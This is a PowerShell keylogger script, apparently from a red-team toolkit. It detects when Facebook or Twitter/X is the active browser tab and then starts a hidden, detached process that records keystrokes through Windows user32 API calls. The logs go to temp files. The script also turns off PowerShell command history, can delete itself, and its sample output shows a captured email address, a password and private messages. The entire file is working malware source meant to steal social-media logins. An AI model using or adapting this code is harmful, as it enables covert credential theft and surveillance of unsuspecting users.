<#
.SYNOPSIS
   Browser keyboad keystrokes capture

   Author: @r00t-3xp10it
   Tested Under: Windows 10 (19044) x64 bits
   Required Dependencies: Get-Process,mscore.ps1
   Optional Dependencies: UserLand,Administrator
   PS cmdlet Dev version: v1.2.8
   
.DESCRIPTION
   Capture target keyboard keystrokes if facebook or
   twitter is open in web browser (browser active tab)

.NOTES
   Browsers supported:MsEdge,Chrome,Chromium,Opera,Safari,Firefox
   The logfiles will be saved under target %TMP% directory under
   names 1_[random].Facebook OR 1_[random].Twitter extensions

   Cmdlet only starts recording keystrokes if facebook or twitter
   its active on browser tab, and it stops is execution if target
   switchs from social media to another site or closes browser, it
   resume capture if social media is accessed again. (active tab)

   1300 milliseconds (default) its the amont of time required for
   key`loger to start execution and build pid.log file. If we chose
   to use less than 1 second delay then cmdlet executes more than
   one instance of powershell (all PIDs will be stoped in the end)
   and that will allow us to have more changes to capture logins.

.Parameter Action
   Start or Stop key`logger (default: start)

.Parameter Delay
   Milliseconds delay between loops (default: 1300)

.Parameter Force
   Switch to bypass check: Is_Browser_Active?

.Parameter AutoDel
   Switch that deletes this cmdlet in the end

.EXAMPLE
   PS C:\> .\SocialMedia.ps1 -action 'start'
   Start browser key`logger capture 

.EXAMPLE
   PS C:\> .\SocialMedia.ps1 -delay '5000'
   Use 5 seconds delay between each loop

.EXAMPLE
   PS C:\> .\SocialMedia.ps1 -force
   Bypass check: Is_Browser_Active?

.EXAMPLE
   PS C:\> .\SocialMedia.ps1 -AutoDel
   Auto-delete this cmdlet in the end!

.EXAMPLE
   PS C:\> .\SocialMedia.ps1 -action 'stop'
   Stop key`logger and leak keystrokes on screen 

.EXAMPLE
   PS C:\> Start-Process -WindowStyle hidden powershell -argumentlist "-file SocialMedia.ps1 -action 'start' -delay '200' -force -autodel"
   Invoke SocialMedia cmdlet in a hidden windows console detach from parent process with the best chances (delay) of capture credentials   

.INPUTS
   None. You cannot pipe objects into SocialMedia.ps1

.OUTPUTS
   * Social media key`logger

   Social Media: Facebook
   Logfile: 1_sdfsrs.Facebook
   ----------------------------
   Annoyed_Wife@hotmailcom
   s3cr3t_bitCh_p4ss
   ----------------------------

   Social Media: Facebook
   Logfile: 2_soimui.Facebook
   ----------------------------
   hello chad, are you here? :P
   ----------------------------

.LINK
   https://github.com/r00t-3xp10it/redpill
   https://github.com/r00t-3xp10it/meterpeter
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$Action="start",
   [int]$Delay='1300',
   [switch]$AutoDel,
   [switch]$Force
)


$CmdletVersion = "v1.2.8"
$ErrorActionPreference = "SilentlyContinue"
## Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
$host.UI.RawUI.WindowTitle = "@SocialMedia $CmdletVersion {SSA@RedTeam}"
If(-not($AutoDel.IsPresent))
{
   write-host "`n* Social media key`logger`n" -ForegroundColor Green
}

## Browser names
$BrowserNames = @(
   "Chromium",
   "Firefox",
   "Chrome",
   "msedge",
   "Safari",
   "Opera"
)

$RawCmdlet = @("function Keystrokes(){
[int]`$totalNumber = 0
echo `$pid >> `$Env:TMP\pid.log ## Store Process PID to be abble to stop it later!
`$Path = `"`$Env:TMP\void.log`"
`$signatures = @'
[DllImport(`"user32.dll`", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 

[DllImport(`"user32.dll`", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);

[DllImport(`"user32.dll`", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);

[DllImport(`"user32.dll`", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
   `$API = Add-Type -MemberDefinition `$signatures -Name 'Win32' -Namespace API -PassThru
   `$null = Ni -Path `$Path -ItemType File -Force
   try{
      While(`$true)
      {
         For(`$ascii = 9; `$ascii -le 128; `$ascii++) 
         {
            `$state = `$API::GetAsyncKeyState(`$ascii)
            If(`$state -eq -32767) 
            {
               `$null = [console]::CapsLock
               `$virtualKey = `$API::MapVirtualKey(`$ascii, 3)
               `$kbstate = New-Object Byte[] 256
               `$checkkbstate = `$API::GetKeyboardState(`$kbstate)
               `$mychar = New-Object -TypeName System.Text.StringBuilder
               `$success = `$API::ToUnicode(`$ascii, `$virtualKey, `$kbstate, `$mychar, `$mychar.Capacity, 0)
                 If(`$success) 
                 {
                    [System.IO.File]::AppendAllText(`$Path, `$mychar, [System.Text.Encoding]::Unicode)
                    `$totalNumber = `$totalNumber+1
                 }
              }
          }
       }
   }
   finally
   {
   }
}
## Records all key presses until
# script is aborted by pressing CTRL+C
Keystrokes")


If($Action -iMatch '^(start)$')
{
   [int]$Counter = 0
   $TestBrowsers = $BrowserNames
   ## Build mscore.ps1 cmdlet in %TMP%
   echo $RawCmdlet|Out-File "$Env:TMP\mscore.ps1" -Encoding string -Force

   If(-not($Force.IsPresent))
   {
      <#
      .SYNOPSIS
         Author: @r00t-3xp10it
         Helper - Make sure there are active browsers.
      #>

      $TestBrowsers = @()
      ForEach($Tokens in $BrowserNames)
      {
         ## Get names from active browsers only
         $Stats = (Get-Process -Name "$Tokens").MainWindowHandle|Where-Object{$_ -NotMatch '^(0)$'}
         If(-not([string]::IsNullOrEmpty($Stats)))
         {
            $TestBrowsers += "$Tokens"
         }
      }

      ## Make sure we have active browser names
      If([string]::IsNullOrEmpty($TestBrowsers))
      {
         write-host "`n   > Error: none supported browsers found active.`n" -ForegroundColor Red
         return ## Exit cmdlet execution (default)
      }
   }


   echo ""
   ## To stop previous process (loop) meterpeter requires this PID
   $pid > "$Env:TMP\met.pid"
   
   
   while($true)
   {
      <#
      .SYNOPSIS
         Author: @r00t-3xp10it
         Helper - Loop funtion to capture keyboard keystrokes.
      #>

      ForEach($Item in $TestBrowsers)
      {
         ## Filter msedge process that runs in background by default
         # and dont have any 'MainWindowTitle' strings to display ( empty )
         $FilterEdge = (Get-Process -Name "$Item").MainWindowHandle|Where-Object{$_ -NotMatch '^(0)$'}
         If(-not([string]::IsNullOrEmpty($FilterEdge)))
         {
            ## Get browser Main Window Title (active tab)
            $StartKeys = (Get-Process -Name "$Item").MainWindowTitle|Where-Object{$_ -NotMatch '^(0)$'}|Where-Object{$_ -ne ''}
            If(($StartKeys -iMatch 'Facebook') -or ($StartKeys -iMatch '/ X |Twitter.com'))
            {
               If($StartKeys -imatch 'Facebook'){$SocialSite = "Facebook"}
               If($StartKeys -imatch '/ X |twitter.com'){$SocialSite = "Twitter"}

               ## If pid.log does not exist = Start process
               If(-not(Test-Path -Path "$Env:TMP\pid.log"))
               {
                  ## Print info onscreen
                  write-host "`n   Browser Name    : $Item"
                  write-host "   Social Media    : $SocialSite"            
                  write-host "   Logfile         : " -NoNewline
                  write-host "$Env:TMP\void.log`n" -ForegroundColor Green

                  ## Execute key`logger in a hidden windows console detach from parent process
                  Start-Process -WindowStyle Hidden powershell -ArgumentList "-file $Env:TMP\mscore.ps1"
                  Start-Sleep -Milliseconds 1600 # Give extra time for execution
               }

               write-host "   > key`logger running in background!"
               Get-Content -Path "$Env:TMP\void.log" -EA SilentlyContinue|Out-File "$Env:TMP\AUTO_BACKUP.${SocialSite}" -force
            }
            Else
            {
               write-host "   > Error: none social media found active!" -ForegroundColor Red
               If(Test-Path -Path "$Env:TMP\pid.log")
               {
                  ## Get key`logger PPID(s) from logfile
                  $PPID = (Get-Content "$Env:TMP\pid.log" -EA SilentlyContinue|Where-Object { $_ -ne '' })

                  ## Kill Process PID(s)
                  ForEach($Thing in $PPID)
                  {
                     ## Check if process ID its running before try to stop it.
                     If([bool](Get-Process -Id "$Thing" -EA SilentlyContinue) -Match 'True')
                     {
                        ## Stop key`logger process by is PPID
                        write-host "   > Stoping key`logger PID: $Thing" -ForegroundColor Green
                        Stop-Process -Id $Thing -Force
                     }
                  }

                  If(Test-Path -Path "$Env:TMP\void.log")
                  {
                     [int]$Counter = [int]$Counter+1
                     ## Random FileName generation - rename logfile [name+extension]
                     # This allows attackers to stop key`logger if target its not on social media
                     $Rand = -join (((48..57)+(65..90)+(97..122)) * 80 |Get-Random -Count 6 |%{[char]$_})
                     
                     $Name = "$Counter"+"_"+"$Rand" -join '' ## Add $Counter to beggining of Name to order creation
                     Move-Item -Path "$Env:TMP\void.log" -Destination "$Env:TMP\${Name}.${SocialSite}" -Force

                     ## Print info onscreen
                     write-host "   > logfile: " -NoNewline
                     write-host "void.log" -ForegroundColor Yellow -NoNewline
                     write-host " renamed to: " -NoNewline
                     write-host "${Name}.${SocialSite}" -ForegroundColor Yellow

                     ## CleanUP
                     Remove-Item -Path "$Env:TMP\pid.log" -Force
                  }
               }
            }         
         }
      }
      ## Delay time between loops
      Start-Sleep -Milliseconds $Delay
   }
}


If($Action -iMatch '^(stop)$')
{
   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Stop key`logger process (PID) and leak captures
   #>

   ## Get key`logger PPID from logfile
   $PPID = (Get-Content "$Env:TMP\pid.log" -EA SilentlyContinue|Where-Object { $_ -ne '' })

   ## Kill Process PID(s)
   ForEach($Proc in $PPID)
   {
      ## Check if process ID its running before try to stop it.
      If([bool](Get-Process -Id "$Proc" -EA SilentlyContinue) -Match 'True')
      {
         ## Stop key-logger process by is PPID
         Stop-Process -Id $Proc -Force
      }
   }

   $GetLogNames = (dir $Env:TMP).Name|findstr /C:'.Facebook' /C:'.Twitter' /C:'AUTO_BACKUP.'
   If(-not([string]::IsNullOrEmpty($GetLogNames)))
   {
      ForEach($PreventDuplicate in $GetLogNames)
      {
         <#
         .SYNOPSIS
            Author: @r00t-3xp10it
            Helper - Prevent Duplicate Logfiles [AUTO_BACKUP]
         #>
         
         $MbACKuPfILE = (dir $Env:TMP).Name|findstr /C:'AUTO_BACKUP.'
         if(-not($PreventDuplicate -match '^(AUTO_BACKUP.)'))
         {
            ## Compare all logs with AUTO_BACKUP. logfile
            $diogene = (Get-Content "$Env:TMP\${MbACKuPfILE}")
            $viriato = (Get-Content "$Env:TMP\${PreventDuplicate}")  
            If("$viriato" -match "$diogene")
            {
               $GetLogNames = (dir $Env:TMP).Name|findstr /C:'.Facebook' /C:'.Twitter'|findstr /V /C:'AUTO_BACKUP.'
               break ## Break loop after found two duplicated files = delete AUTO_BACKUP. from [output] table
            }
         }
      }

      ForEach($Report in $GetLogNames)
      {
         <#
         .SYNOPSIS
            Author: @r00t-3xp10it
            Helper - [output] Leak captures OnScreen
         #>      
      
         ## Get social media names from extension
         $SocialSite = ($Report).split('.')[1]
         write-host "`nSocial Media: $SocialSite"      
         write-host "Logfile: $Report"
         write-host "----------------------------"
         Get-Content -Path "$Env:TMP\${Report}" -EA SilentlyContinue
         Remove-Item -Path "$Env:TMP\${Report}" -Force
         write-host "----------------------------`n"   
      }

      ## CleanUP
      Remove-Item -Path "$Env:TMP\*.log" -Force
   }
   Else
   {
      write-host "`n   > Error: none key`logger logfiles found!`n" -ForegroundColor Red
   }
}


## CleanUP
Remove-Item -Path "$Env:TMP\*.log" -Force
Remove-Item -Path "$Env:TMP\mscore.ps1" -Force


If($AutoDel.IsPresent)
{
   ## Auto Delete this cmdlet in the end ...
   Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force
}